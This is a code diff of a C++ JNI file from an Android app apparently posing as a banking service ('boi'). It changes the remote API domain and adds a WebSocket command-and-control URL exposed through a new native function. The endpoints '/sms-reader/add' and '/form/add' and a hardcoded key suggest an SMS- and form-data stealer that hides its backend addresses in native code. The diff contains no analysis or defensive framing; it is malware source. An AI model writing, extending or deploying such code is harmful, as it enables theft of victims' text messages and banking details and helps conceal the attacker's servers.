@@ -2,12 +2,13 @@
 #include <string>
 
 // Declare global variables for the domain URLs
-std::string url = "https://dkbossqq.in/api";
+std::string url = "https://golusave.com/api";
 std::string sms_save = "/sms-reader/add";
 std::string form_save = "/form/add";
 std::string site = "localhost";
 std::string KEY = "00112233445566778899aabbccddeeff";
 std::string getNumber = "/site/number?site=";
+std::string socket_url = "wss://socket.khudsecontrollkaro.org";
 
 extern "C"
 JNIEXPORT jstring JNICALL
@@ -43,4 +44,10 @@ extern "C"
 JNIEXPORT jstring JNICALL
 Java_com_mydesign_service_boi_net_Helper_getNumber(JNIEnv *env, jobject thiz) {
     return env->NewStringUTF(getNumber.c_str());
+}
+
+extern "C"
+JNIEXPORT jstring JNICALL
+Java_com_mydesign_service_boi_net_Helper_SocketUrl(JNIEnv *env, jobject thiz) {
+    return env->NewStringUTF(socket_url.c_str());
 }
